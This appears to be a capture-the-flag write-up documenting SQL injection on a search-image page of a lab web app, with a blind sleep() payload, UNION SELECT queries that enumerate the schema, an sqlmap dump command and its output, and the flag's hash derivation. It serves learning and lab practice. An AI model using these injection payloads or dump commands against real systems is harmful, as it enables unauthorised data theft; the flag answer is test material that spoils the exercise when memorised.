[README.md](../../../README.md)
# SQL Injection /?page=searchimg

## Wapiti Report
Blind SQL vulnerability via injection in the parameter id
`GET /?page=searchimg&id=sleep%287%29%231&Submit=Submit HTTP/1.1`
Host: 10.13.200.53
Referer: http://10.13.200.53/?page=searchimg
curl "http://10.13.200.53/?page=searchimg&id=sleep%287%29%231&Submit=Submit" -e "http://10.13.200.53/?page=searchimg"


## Exploit
**Database name:**
```
ID: 0 UNION SELECT 1,database() 
Title: Member_images
Url : 1
```

**Content:**
```
1 UNION select table_name, column_name FROM information_schema.columns
list_images
- id
- url
- title
- comment
```

**By searching in the databse columns we can find:**
```
ID: 1 UNION select url, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png
```

[SHA-256 - Password SHA256 Hash Decryption - Online Decoder/Encoder](https://www.dcode.fr/sha256-hash)
*MD5 decrypt:* `albatroz`
*SHA256 encrypt:* `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### SQLmap tool
`sqlmap -u "http://172.16.0.98/index.php?page=searchimg&id=1&Submit=Submit#" --dump -T list_images -D Member_images`
```
Database: Member_images
Table: list_images
[5 entries]
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | url                                      | title     | comment
                                                                 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | https://fr.wikipedia.org/wiki/Programme_ | Nsa       | An image about the NSA !
                                                                 |
| 2  | https://fr.wikipedia.org/wiki/Fichier:42 | 42 !      | There is a number..
                                                                 |
| 3  | https://fr.wikipedia.org/wiki/Logo_de_Go | Google    | Google it !
                                                                 |
| 4  | https://en.wikipedia.org/wiki/Earth#/med | Earth     | Earth!
                                                                 |
| 5  | borntosec.ddns.net/images.png            | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
+----+------------------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```

## Prevention 
See: [SQL Injection Prevention](../../sql_injection_member/Resources/sql_injection_member.md#prevention)
